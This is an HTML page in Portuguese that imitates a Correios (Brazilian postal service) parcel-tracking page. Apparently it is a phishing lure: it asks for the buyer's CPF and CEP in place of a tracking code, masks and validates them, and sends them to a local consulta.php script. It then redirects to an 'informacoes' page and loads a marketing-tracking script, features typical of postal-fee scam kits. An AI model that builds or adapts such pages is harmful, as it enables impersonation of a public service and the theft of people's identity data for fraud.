<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Correios | Rastreio</title>
  <link rel="stylesheet" href="css/bootstrap.css">
  <link rel="stylesheet" href="css/app.css">
  <link rel="stylesheet" href="css/yellow.css">
  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
  <style>
    /* Seus estilos originais mantidos */
    @keyframes pulsar {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    
    #consultar-btn {
      animation: pulsar 1s infinite;
      transition: all 0.3s ease;
    }
    
    #consultar-btn:disabled {
      animation: none;
      opacity: 0.7;
    }

    /* Loading melhorado */
    .spinner-container {
      display: none;
      text-align: center;
      margin: 20px 0;
      padding: 20px;
      background: rgba(255,255,255,0.9);
      border-radius: 8px;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(0, 123, 255, 0.2);
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* Validação visual */
    .input-error {
      border-color: #dc3545 !important;
      box-shadow: 0 0 0 0.25rem rgba(220,53,69,.25);
    }
    
    .error-message {
      color: #dc3545;
      font-size: 0.875em;
      margin-top: 0.25rem;
      display: none;
    }
  </style>
</head>
<body>
  <!-- Cabeçalho mantido conforme original -->
  <header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
      <span>Acessibilidade</span>
      <i class="fas fa-caret-down ml-1"></i>
    </div>
    <div class="">
      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
        <div class="menu-toggle" id="menu-toggle" style="width:50px">
          <div class="bar"></div>
          <div class="bar"></div>
          <div class="bar"></div>
        </div>
        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
          <a href="#" class="py-2">
            <img src="images/correios.png" alt="Correios" height="25">
          </a>
        </div>
        <div class="ml-4 d-none d-lg-block" style="width:150px">
          <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
            <img src="images/entrar.svg" alt="Entrar" width="31">
            <span class="ml-1">Entrar</span>
          </a>
        </div>
      </nav>
    </div>
  </header>

  <main>
    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto;">
      Rastreamento
    </h1>

    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
      <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
      </h5>

      <form id="form-rastreamento">
        <div class="form-group">
          <label>Deseja acompanhar seu objeto?</label>
          <span class="d-block">Digite o CPF do comprador.</span>
          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf">
          <div class="error-message" id="cpf-error">Por favor, insira um CPF válido com 11 dígitos</div>
        </div>

        <div class="form-group">
          <label>Informe o seu CEP abaixo.</label>
          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required>
          <div class="error-message" id="cep-error">Por favor, insira um CEP válido com 8 dígitos</div>
        </div>

        <div class="form-group form-check">
          <input type="checkbox" class="form-check-input" id="nao-sei-cep">
          <label class="form-check-label" for="nao-sei-cep">Não sei meu CEP</label>
        </div>

        <div class="form-group mt-4 d-flex justify-content-center" id="botao-container">
          <button type="submit" class="btn btn-primary btn-lg px-5" id="consultar-btn">
            <span id="btn-text">Consultar</span>
          </button>
        </div>

        <div id="loading-container" class="spinner-container">
          <div class="spinner"></div>
          <p class="font-weight-bold">Consultando seus dados...</p>
          <p class="small text-muted">Por favor, aguarde enquanto processamos sua solicitação</p>
        </div>
      </form>
    </section>

    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
      <div>
        <img src="images/banner-1.jpg" alt="Serviços Correios" class="w-100 rounded">
      </div>
    </section>
  </main>

  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
      <ul class="list-unstyled">
        <li class="mb-2 font-size-14">
          <i class="fas fa-desktop mr-2"></i>
          <a href="#" class="text-blue-dark text-hover-orange">
            <span class="text-wrap">Registro de Manifestações</span>
          </a>
        </li>
      </ul>
    </div>
  </footer>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Elementos DOM
      const form = document.getElementById('form-rastreamento');
      const cpfInput = document.getElementById('cpf');
      const cepInput = document.getElementById('cep');
      const cepCheckbox = document.getElementById('nao-sei-cep');
      const consultarBtn = document.getElementById('consultar-btn');
      const btnText = document.getElementById('btn-text');
      const loadingContainer = document.getElementById('loading-container');
      const cpfError = document.getElementById('cpf-error');
      const cepError = document.getElementById('cep-error');

      // Máscaras de entrada
      cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 3) value = value.replace(/^(\d{3})/, '$1.');
        if (value.length > 7) value = value.replace(/^(\d{3})\.(\d{3})/, '$1.$2.');
        if (value.length > 11) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})/, '$1.$2.$3-');
        e.target.value = value.substring(0, 14);
      });

      cepInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 5) value = value.replace(/^(\d{5})/, '$1-');
        e.target.value = value.substring(0, 9);
      });

      // Gerenciamento do checkbox CEP
      cepCheckbox.addEventListener('change', function() {
        cepInput.disabled = this.checked;
        cepInput.required = !this.checked;
        if (this.checked) {
          cepInput.value = '';
        }
      });

      // Envio do formulário
      form.addEventListener('submit', async function(e) {
        e.preventDefault();

        // Obter e limpar valores
        const cpf = cpfInput.value.replace(/\D/g, '');
        const cep = cepCheckbox.checked ? '' : cepInput.value.replace(/\D/g, '');
        
        // Validações
        if (cpf.length !== 11) {
          cpfError.style.display = 'block';
          return;
        } else {
          cpfError.style.display = 'none';
        }

        if (!cepCheckbox.checked && cep.length !== 8) {
          cepError.style.display = 'block';
          return;
        } else {
          cepError.style.display = 'none';
        }

        // Configuração do botão e loading
        consultarBtn.disabled = true;
        btnText.textContent = 'Processando...';
        loadingContainer.style.display = 'block';

        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 15000);

          const response = await fetch(`consulta.php?cpf=${cpf}&cep=${cep}`, {
            signal: controller.signal
          });

          clearTimeout(timeoutId);

          if (!response.ok) {
            const errorData = await response.json().catch(() => ({}));
            throw new Error(errorData.message || `Erro HTTP: ${response.status}`);
          }

          const data = await response.json();

          if (data.status === 200) {
            window.location.href = "informacoes" + window.location.search;
          } else {
            throw new Error(data.message || 'Erro na consulta');
          }
        } catch (error) {
          console.error('Erro detalhado:', error);
          alert(`Erro: ${error.message}\nPor favor, tente novamente.`);
        } finally {
          consultarBtn.disabled = false;
          btnText.textContent = 'Consultar';
          loadingContainer.style.display = 'none';
        }
      });
    });
  </script>
</body>
</html>
